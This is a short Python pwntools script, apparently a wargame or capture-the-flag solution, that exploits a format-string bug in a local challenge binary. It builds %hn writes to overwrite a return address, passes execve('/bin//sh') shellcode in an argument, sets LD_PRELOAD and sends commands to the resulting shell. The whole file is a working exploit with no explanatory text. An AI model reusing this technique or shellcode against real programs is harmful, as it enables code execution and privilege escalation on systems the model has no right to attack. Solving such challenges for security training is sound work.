from pwn import *
import base64
#from myShellCode import getShellCode
#from common import createArguments

def createArguments(prev, val, i):
        cmd = ''
        cmd += "%"
        cmd += "%d" % ((0x10000 - prev) + val)
        cmd += "c"
        cmd += "%"
        cmd += "%d" % (70+i)
        cmd += "$hn"
        return cmd


prog = '/var/challenge/level12/12'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
env = {}
env['LD_PRELOAD'] = './pre.so'
trgt = 0xffffdc01
retaddr = 0xffffd9b4

l = 6
s = '..'
s += p32(retaddr)
s += p32(retaddr+2)
l += len(s)

old_val = l
val = trgt & 0xffff
s += createArguments(old_val, val, 0)
old_val = val
val = trgt >> 16
s += createArguments(old_val, val, 1)
s = s.ljust(64)
arg1 = s
arg2 = shellcode
p = process(executable=prog, argv=[prog, arg1, arg2], env=env)
p.sendline("l33t;exit")
print p.recvall()
